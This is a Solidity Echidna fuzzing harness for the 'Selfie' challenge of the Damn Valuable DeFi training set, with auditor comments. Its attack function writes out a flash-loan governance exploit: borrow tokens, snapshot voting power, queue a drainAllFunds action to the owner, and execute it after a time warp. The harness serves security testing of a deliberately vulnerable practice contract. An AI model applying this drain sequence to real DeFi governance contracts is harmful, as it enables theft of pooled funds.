pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "../src/DamnValuableTokenSnapshot.sol";
import "../src/SimpleGovernance.sol";
import "../src/SelfiePool.sol";

/// @dev Run the template with
///      ```
///      cd repo
///      solc-select use 0.8.0
///      echidna test/Invariants.sol --contract Echidna --config test/echidna.config.yaml
///      ```
interface IHevm {
    function warp(uint x) external;
}

contract Echidna {
    using Address for address payable;

    address constant HEVM_ADDRESS = 0x7109709ECfa91a80626fF3989D68f67F5b1DD12D;
    IHevm hevm = IHevm(HEVM_ADDRESS);

    address _owner;
    Deployer _deployer;

    DamnValuableTokenSnapshot private _token;
    SimpleGovernance private _gov;
    SelfiePool private _pool;

    uint256 public immutable TOKENS_IN_POOL = 1500000;

    constructor() {
        _owner = msg.sender;

        _deployer = new Deployer();
        (_token, _gov, _pool) = _deployer.deploy();
    }

    // //////////////
    // EDUCATED GUESS
    // //////////////

    function attack(uint256 amount, uint256 actionId) external {
        _pool.flashLoan(amount);

        // @audit if no warp needed, this test works. hevm.warp cheatcode doesn't seem to work in echidna. more investigation needed
        // @audit-info https://github.com/crytic/building-secure-contracts/blob/77229ace5e7b871a6127e51588ffd1c7c6f20a3d/program-analysis/echidna/advanced/on-using-cheat-codes.md
        hevm.warp(3 days);

        _gov.executeAction(actionId);
    }

    function receiveTokens(address token, uint256 amount) external {
        _token.snapshot();
        _token.getBalanceAtLastSnapshot(address(this));

        _gov.queueAction(
            address(_pool),
            abi.encodeWithSignature("drainAllFunds(address)", _owner),
            0
        );

        ERC20Snapshot(token).transfer(address(_pool), amount);
    }

    // /////////////////
    // SUSPECT FUNCTIONS
    // /////////////////

    // function flashLoan(uint256 amount) external {
    //     _pool.flashLoan(amount);
    // }

    // function executeAction(uint256 actionId) external {
    //     _gov.executeAction(actionId);
    // }

    // ////////////////////
    // INVARIANT PROPERTIES
    // ////////////////////

    function echidna_lender_balance_cannot_decrease()
        public
        view
        returns (bool)
    {
        return _token.balanceOf(address(_pool)) >= TOKENS_IN_POOL;
    }
}

contract Deployer {
    uint256 public immutable INITIAL_SUPPLY = 2000000;
    uint256 public immutable TOKENS_IN_POOL = 1500000;

    function deploy()
        external
        returns (
            DamnValuableTokenSnapshot token,
            SimpleGovernance gov,
            SelfiePool pool
        )
    {
        token = new DamnValuableTokenSnapshot(INITIAL_SUPPLY);

        gov = new SimpleGovernance(address(token));
        pool = new SelfiePool(address(token), address(gov));
        token.transfer(address(pool), TOKENS_IN_POOL);
        token.snapshot();
    }
}
